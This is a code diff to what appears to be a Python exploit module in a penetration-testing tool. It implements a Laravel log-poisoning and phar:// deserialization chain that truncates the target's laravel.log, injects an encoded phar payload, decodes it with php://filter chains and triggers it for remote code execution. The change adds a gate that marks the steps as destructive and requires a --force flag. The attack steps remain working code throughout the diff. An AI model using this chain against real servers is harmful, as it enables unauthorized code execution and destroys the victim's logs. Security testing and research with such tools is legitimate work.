@@ -344,25 +344,32 @@ def _run_chain(session, url, phar_bytes, markers=_SUCCESS_MARKERS,
     decode = (f"php://filter/write=convert.quoted-printable-decode|"
               f"convert.iconv.utf-16le.utf-8|convert.base64-decode/resource={log_path}")
     last_body = ""
-    for pad in range(pad_range[0], pad_range[1]):
+    # Truncating and poisoning the target's live laravel.log is DESTRUCTIVE — declare it
+    # so the tier gate requires --force / --allow-destructive. RequestBlocked must NOT be
+    # swallowed by the per-pad `except Exception`; it propagates to exploit() which returns
+    # a clean "requires --force" result instead of silently doing nothing.
+    with http_config.request_tier(http_config.DESTRUCTIVE):
+        for pad in range(pad_range[0], pad_range[1]):
+            try:
+                _solve(session, url, f"php://filter/read=consumed/resource={log_path}")  # truncate
+                _solve(session, url, _encode_payload(phar_bytes, pad))                   # inject
+                _solve(session, url, "AA")                                               # 2nd probe
+                _solve(session, url, decode)                                             # decode->raw
+                r = _solve(session, url, f"phar://{log_path}/test.txt")                  # trigger
+                last_body = r.text or ""
+            except http_config.RequestBlocked:
+                raise
+            except Exception:
+                continue
+            if proof_marker and _extract_marked_output(last_body, proof_marker) is not None:
+                return True, last_body, pad
+            if not proof_marker and any(m in last_body for m in markers):
+                return True, last_body, pad
+        # best-effort cleanup
         try:
-            _solve(session, url, f"php://filter/read=consumed/resource={log_path}")  # truncate
-            _solve(session, url, _encode_payload(phar_bytes, pad))                   # inject
-            _solve(session, url, "AA")                                               # 2nd probe
-            _solve(session, url, decode)                                             # decode->raw
-            r = _solve(session, url, f"phar://{log_path}/test.txt")                  # trigger
-            last_body = r.text or ""
+            _solve(session, url, f"php://filter/read=consumed/resource={log_path}")
         except Exception:
-            continue
-        if proof_marker and _extract_marked_output(last_body, proof_marker) is not None:
-            return True, last_body, pad
-        if not proof_marker and any(m in last_body for m in markers):
-            return True, last_body, pad
-    # best-effort cleanup
-    try:
-        _solve(session, url, f"php://filter/read=consumed/resource={log_path}")
-    except Exception:
-        pass
+            pass
     return False, last_body, None
 
 
@@ -512,9 +519,16 @@ def exploit(target_url: str, *, username: str = None, password: str = None,
                 return result
 
         # --- 2. Deliver: log-poison + phar:// trigger, sweeping pad alignment ----------
-        ok, body, pad = _run_chain(sess, endpoint, phar_bytes,
-                                   log_path=log_path, pad_range=pad_range,
-                                   proof_marker=proof_marker)
+        try:
+            ok, body, pad = _run_chain(sess, endpoint, phar_bytes,
+                                       log_path=log_path, pad_range=pad_range,
+                                       proof_marker=proof_marker)
+        except http_config.RequestBlocked as e:
+            # Sink was reachable, but log-poison is destructive and the ceiling forbids it.
+            result["reason"] = str(e)
+            result["requires"] = ["--force"]
+            result["artifacts"]["sink_confirmed"] = True
+            return result
 
         if ok:
             # Extract the command-output line(s) for verbatim evidence
